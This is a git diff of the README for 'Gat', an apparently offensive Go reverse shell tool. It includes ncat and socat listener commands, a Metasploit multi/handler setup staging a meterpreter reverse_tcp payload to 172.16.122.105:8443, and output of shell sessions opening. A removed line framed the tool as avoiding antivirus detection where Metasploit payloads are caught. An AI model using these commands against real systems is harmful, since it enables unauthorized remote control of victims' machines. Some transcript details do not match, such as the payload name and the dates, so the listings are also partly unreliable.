@@ -14,8 +14,6 @@ Supported OS are:
 
 ## Why ?
 
-Although Metasploit payloads are great, they are often times spotted by AV products.
-
 The goal of this project is to get a simple reverse shell, which can work on multiple systems.
 
 ## How ?
@@ -30,12 +28,12 @@ your Golang environment (with the `$GOPATH` environment variable).
 Then, just run `go get github.com/m1ddl3w4r3/Gat` to fetch the project.
 
 or from source
-``
+```
 git clone https://github.comm1ddl3w4r3/Gat.git
 cd Gat
 go mod init Gat/Gat
 go mod tidy
-``
+```
 ### Building the payload
 
 To simplify things, you can use the provided Makefile.
@@ -132,7 +130,7 @@ Ncat: Listening on 0.0.0.0:1234
 Ncat: Connection from 172.16.122.105.
 Ncat: Connection from 172.16.122.105:47814.
 [Gat]> whoami
-desktop-3pvv31a\lab
+LWS01/sconner
 ```
 
 Here is an example with `socat` (tested with version `1.7.3.2`):
@@ -140,7 +138,7 @@ Here is an example with `socat` (tested with version `1.7.3.2`):
 $ socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
 # connection would be initiated here
 [Gat]> whoami
-desktop-3pvv31a\lab
+LWS01\sconner
 ```
 
 ### meterpreter staging
@@ -161,20 +159,12 @@ To use the correct one, just specify the transport you want to use (tcp, http, h
 To use the meterpreter staging feature, just start your handler:
 
 ```bash
-[14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
-[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
-payload => windows/x64/meterpreter/reverse_https
-[14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
-lhost => 172.16.122.105
-[14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
-lport => 8443
-[14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
-HandlerSSLCert => ./server.pem
-[14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
-[*] Exploit running as background job 0.
-
-[*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://172.16.122.105:8443
-[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 172.16.122.105
+set lport 8443
+set HandlerSSLCert ./server.pem
+exploit -j
 ```
 
 Then, in `Gat`, use the `meterpreter` command:
@@ -187,7 +177,7 @@ A new meterpreter session should pop in `msfconsole`:
 
 ```bash
 [14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
-[*] [2018.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
+[*] [2022.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
 [*] meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100
 
 [14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions
